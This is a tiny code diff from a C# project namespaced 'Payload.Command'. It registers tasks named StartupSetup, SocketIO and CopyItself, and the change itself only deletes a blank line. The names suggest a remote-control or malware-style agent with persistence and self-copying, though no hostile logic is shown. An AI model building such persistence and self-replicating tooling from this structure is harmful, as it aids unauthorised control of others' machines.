@@ -54,7 +54,6 @@ namespace Payload.Command
             TaskMap.Add(Common.Config.EnumTask.StartupSetup, new StartupSetupFactory().CreateTaskPack());
             TaskMap.Add(Common.Config.EnumTask.SocketIO, new SocketIOClientFactory().CreateTaskPack());
 
-
             TaskMap.Add(Common.Config.EnumTask.CopyItself, new CopyItselfFactory().CreateTaskPack());
         }
 
